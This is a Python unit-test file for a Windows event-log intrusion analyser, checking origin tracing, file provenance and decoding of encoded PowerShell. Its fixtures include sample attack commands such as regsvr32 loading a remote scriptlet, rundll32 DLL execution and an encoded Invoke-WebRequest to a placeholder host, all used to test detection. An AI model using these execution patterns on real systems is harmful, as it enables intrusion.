from __future__ import annotations

import base64
from datetime import datetime, timedelta, timezone
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
from xml.sax.saxutils import escape

from cat_app import analyzer
from cat_app.analyzer import analyze_events
from cat_app.evtx_reader import parse_event_files, parse_event_xml
from cat_app.models import EventRecord, ParseResult


START = datetime(2026, 9, 1, tzinfo=timezone.utc)
SYSMON = "Microsoft-Windows-Sysmon"
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"


def event(record_id: int, event_id: str = "1", *, host: str = "PC01", provider: str = SYSMON,
          channel: str = SYSMON_CHANNEL, **data: str) -> EventRecord:
    return EventRecord(
        source_file="origin.xml", event_id=event_id, provider=provider, channel=channel,
        computer=host, time_created=START + timedelta(seconds=record_id),
        record_id=str(record_id), event_data=data,
    )


def result(events: list[EventRecord]) -> ParseResult:
    return ParseResult(events, [], [], len(events), len(events))


def process(record_id: int, image: str, guid: str, parent: str = "", command: str = "") -> EventRecord:
    return event(record_id, ProcessGuid=guid, ProcessId=str(100 + record_id),
                 Image=image, ParentProcessGuid=parent, CommandLine=command or image)


class OriginTraceTests(unittest.TestCase):
    def test_regsvr32_literal_dll_is_traced_to_its_file_creator(self) -> None:
        dropper = process(1, r"C:\Users\alice\Downloads\invoice.exe", "{dropper}")
        payload_path = r"C:\Users\alice\AppData\Local\Temp\helper module.dll"
        write = event(2, "11", ProcessGuid="{dropper}", Image=dropper.event_data["Image"], TargetFilename=payload_path)
        lolbin = process(3, r"C:\Windows\System32\regsvr32.exe", "{lolbin}",
                         command=f'regsvr32.exe /s "{payload_path}"')
        chain = analyze_events(result([dropper, write, lolbin]), None, None)["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{dropper}")
        artifact = chain["payload_artifacts"][0]
        self.assertEqual(artifact["referenced_path"], payload_path)
        self.assertEqual(artifact["creation_source_refs"], ["origin.xml#2"])
        self.assertEqual(chain["file_provenance"][0]["target_kind"], "command_referenced_payload")
        self.assertFalse(artifact["confirmed"])

    def test_static_payload_paths_support_exact_literals_but_not_expressions_or_urls(self) -> None:
        cases = [
            ("rundll32.exe", r'rundll32.exe "C:\Temp\helper module.dll",EntryPoint', [r"C:\Temp\helper module.dll"]),
            ("regsvr32.exe", r'regsvr32.exe /i:"C:\Temp\test.sct" scrobj.dll', [r"C:\Temp\test.sct"]),
            ("powershell.exe", r'powershell.exe -File "C:\Temp\job.ps1"', [r"C:\Temp\job.ps1"]),
            ("powershell.exe", r'powershell.exe -Command "C:\Temp\job.ps1"', []),
            ("regsvr32.exe", r'regsvr32.exe /i:https://example.invalid/test.sct scrobj.dll', []),
            ("regsvr32.exe", r'regsvr32.exe C:\Users\%USERNAME%\payload.dll', []),
        ]
        for name, command, expected in cases:
            with self.subTest(command=command):
                node = analyzer._intrusion_process_node(process(1, "C:\\Windows\\System32\\" + name, "{node}", command=command))
                self.assertEqual(analyzer._intrusion_literal_payload_paths(node), expected)

    def test_powershell_execution_pid_links_scriptblock_to_created_process(self) -> None:
        script = "Invoke-WebRequest 'https://example.invalid/sample.txt'"
        encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
        parent = process(1, r"C:\Users\alice\Downloads\invoice.exe", "{parent}")
        child = process(2, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "{script}", "{parent}")
        xml = f'''<Event><System><Provider Name="Microsoft-Windows-PowerShell"/>
            <EventID>4104</EventID><Channel>Microsoft-Windows-PowerShell/Operational</Channel>
            <Computer>PC01</Computer><EventRecordID>3</EventRecordID><Execution ProcessID="102"/>
            <TimeCreated SystemTime="2026-09-01T00:00:03Z"/></System>
            <EventData><Data Name="ScriptBlockText">[Convert]::FromBase64String('{encoded}')</Data></EventData></Event>'''
        script_event = parse_event_xml(xml, "origin.xml")
        restored = EventRecord.from_dict(script_event.to_dict())
        self.assertEqual(restored.execution_process_id, "102")
        chain = analyze_events(result([parent, child, restored]), None, None)["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{parent}")
        script_step = next(step for step in chain["steps"] if step["event_id"] == "4104")
        self.assertEqual(script_step["process_instance_id"], "guid:pc01|{script}")
        self.assertIn("PID", script_step["relationship_basis"])

    def test_upstream_executable_is_traced_through_shell_before_lolbin(self) -> None:
        source = process(1, r"C:\Users\alice\Downloads\invoice.exe", "{source}")
        shell = process(2, r"C:\Windows\System32\cmd.exe", "{shell}", "{source}")
        lolbin = process(3, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{shell}")
        analysis = analyze_events(result([source, shell, lolbin]), None, None)
        chain = analysis["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{source}")
        self.assertEqual(chain["observed_trigger_process"]["process_guid"], "{lolbin}")
        self.assertEqual(chain["initiating_process_candidate"]["process_guid"], "{source}")
        self.assertFalse(chain["origin_assessment"]["malware_confirmed"])
        self.assertFalse(chain["origin_assessment"]["initial_compromise_confirmed"])
        self.assertEqual({item["process_guid"] for item in chain["processes"]}, {"{source}", "{shell}", "{lolbin}"})

    def test_common_parent_is_context_and_missing_initial_source_is_explicit(self) -> None:
        parent = process(1, r"C:\Windows\explorer.exe", "{parent}")
        lolbin = process(2, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{parent}")
        chain = analyze_events(result([parent, lolbin]), None, None)["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{lolbin}")
        self.assertIsNone(chain["initiating_process_candidate"])
        self.assertEqual(chain["origin_assessment"]["status"], "initial_source_unresolved")
        self.assertEqual(chain["upstream_process_context"][0]["process_guid"], "{parent}")
        self.assertTrue(any(step["event_kind"] == "upstream_process_context" for step in chain["steps"]))

    def test_file_creation_provenance_traces_disconnected_dropper(self) -> None:
        dropper = process(1, r"C:\Users\alice\Downloads\setup.exe", "{dropper}")
        write = event(2, "11", ProcessGuid="{dropper}", Image=dropper.event_data["Image"],
                      TargetFilename=r"C:\Users\alice\AppData\Local\Temp\agent.exe")
        payload = process(3, write.event_data["TargetFilename"], "{payload}")
        lolbin = process(4, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{payload}")
        chain = analyze_events(result([dropper, write, payload, lolbin]), None, None)["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{dropper}")
        self.assertEqual(chain["confidence"], "low")
        self.assertEqual(chain["file_provenance"][0]["creator_process_guid"], "{dropper}")
        self.assertIn("origin.xml#2", chain["source_refs"])
        self.assertTrue(any(step["event_kind"] == "file_provenance" for step in chain["steps"]))
        self.assertTrue(chain["file_provenance"][0]["limitation"])

    def test_wrong_host_basename_or_future_write_never_links_file_origin(self) -> None:
        for overrides in (
            {"host": "OTHER"},
            {"TargetFilename": r"C:\different\agent.exe"},
            {"provider": "Fake-Sysmon"},
            {"record_id": 8},
        ):
            with self.subTest(overrides=overrides):
                dropper = process(1, r"C:\Users\alice\Downloads\setup.exe", "{dropper}")
                values = {"record_id": 2, "event_id": "11", "ProcessGuid": "{dropper}",
                          "Image": dropper.event_data["Image"], "TargetFilename": r"C:\Users\alice\AppData\Local\Temp\agent.exe"}
                values.update(overrides)
                write = event(**values)
                payload = process(3, r"C:\Users\alice\AppData\Local\Temp\agent.exe", "{payload}")
                lolbin = process(4, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{payload}")
                chain = analyze_events(result([dropper, write, payload, lolbin]), None, None)["intrusion_chain"]
                self.assertEqual(chain["origin_process"]["process_guid"], "{payload}")
                self.assertEqual(chain["file_provenance"], [])

    def test_latest_write_replaces_earlier_possible_dropper(self) -> None:
        dropper = process(1, r"C:\Users\alice\Downloads\setup.exe", "{dropper}")
        browser = process(2, r"C:\Program Files\Browser\chrome.exe", "{browser}")
        path = r"C:\Users\alice\AppData\Local\Temp\agent.exe"
        old = event(3, "11", ProcessGuid="{dropper}", Image=dropper.event_data["Image"], TargetFilename=path)
        latest = event(4, "11", ProcessGuid="{browser}", Image=browser.event_data["Image"], TargetFilename=path)
        payload = process(5, path, "{payload}")
        lolbin = process(6, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{payload}")
        chain = analyze_events(result([dropper, browser, old, latest, payload, lolbin]), None, None)["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_guid"], "{payload}")
        self.assertEqual(chain["file_provenance"][0]["creator_process_guid"], "{browser}")

    def test_decoded_script_signals_and_text_reach_findings_and_chain(self) -> None:
        script = "Invoke-WebRequest 'https://example.invalid/sample.txt'"
        encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
        sample = process(1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "{script}",
                         command=f"powershell.exe -EncodedCommand {encoded}")
        analysis = analyze_events(result([sample]), None, None)
        finding = next(item for item in analysis["findings"] if item["rule_id"] == "suspicious_powershell")
        decoded = finding["evidence"][0]["decoded_powershell"]
        self.assertEqual(decoded["decoded_scripts"][0]["text"], script)
        self.assertIn("network_transfer_command", decoded["signals"])
        self.assertTrue(analysis["intrusion_chain"]["origin_process"]["decoded_powershell"])
        self.assertEqual(analysis["suspicious_events"][0]["decoded_powershell"], decoded)

    def test_file_and_powershell_spool_survive_general_record_limit(self) -> None:
        script = "Invoke-WebRequest 'https://example.invalid/sample.txt'"
        encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
        events = [
            process(1, r"C:\Users\alice\Downloads\setup.exe", "{dropper}"),
            event(2, "11", ProcessGuid="{dropper}", Image=r"C:\Users\alice\Downloads\setup.exe",
                  TargetFilename=r"C:\Users\alice\AppData\Local\Temp\agent.exe"),
            process(3, r"C:\Users\alice\AppData\Local\Temp\agent.exe", "{payload}"),
            process(4, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{payload}"),
            event(5, "4104", provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational",
                  ScriptBlockText=f"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}'))"),
        ]
        xml_events = []
        for item in events:
            fields = "".join(f'<Data Name="{key}">{escape(value)}</Data>' for key, value in item.event_data.items())
            xml_events.append(f'<Event><System><Provider Name="{item.provider}"/><EventID>{item.event_id}</EventID>'
                              f'<Channel>{item.channel}</Channel><Computer>{item.computer}</Computer>'
                              f'<EventRecordID>{item.record_id}</EventRecordID><TimeCreated SystemTime="{item.time_created.isoformat()}"/>'
                              f'</System><EventData>{fields}</EventData></Event>')
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "spool.xml"
            path.write_text("<Events>" + "".join(xml_events) + "</Events>", encoding="utf-8")
            parsed = parse_event_files([path], None, None, max_records=1)
            try:
                analysis = analyze_events(parsed, None, None)
            finally:
                parsed.close()
        self.assertEqual(analysis["intrusion_chain"]["origin_process"]["process_guid"], "{dropper}")
        self.assertEqual(analysis["endpoint_rule_scope"]["extra_records_included"], 2)
        self.assertTrue(any(item["rule_id"] == "suspicious_powershell" for item in analysis["findings"]))

    def test_real_eventlog_1102_provider_is_detected_but_fake_provider_is_not(self) -> None:
        real = event(1, "1102", provider="Microsoft-Windows-Eventlog", channel="Security", SubjectUserName="alice")
        fake = event(2, "1102", provider="Fake-Provider", channel="Security", SubjectUserName="alice")
        analysis = analyze_events(result([real, fake]), None, None)
        cleared = [item for item in analysis["suspicious_events"] if item["event_id"] == "1102"]
        self.assertEqual([item["record_id"] for item in cleared], ["1"])

    def test_file_link_capacity_has_explicit_limitation(self) -> None:
        dropper = process(1, r"C:\Users\alice\Downloads\setup.exe", "{dropper}")
        path = r"C:\Users\alice\AppData\Local\Temp\agent.exe"
        write = event(2, "11", ProcessGuid="{dropper}", Image=dropper.event_data["Image"], TargetFilename=path)
        payload = process(3, path, "{payload}")
        lolbin = process(4, r"C:\Windows\System32\regsvr32.exe", "{lolbin}", "{payload}")
        with patch.object(analyzer, "INTRUSION_FILE_MATCH_LIMIT", 0):
            chain = analyze_events(result([dropper, write, payload, lolbin]), None, None)["intrusion_chain"]
        self.assertTrue(chain["source"]["file_provenance_limit_reached"])
        self.assertTrue(chain["truncated"])


if __name__ == "__main__":
    unittest.main()
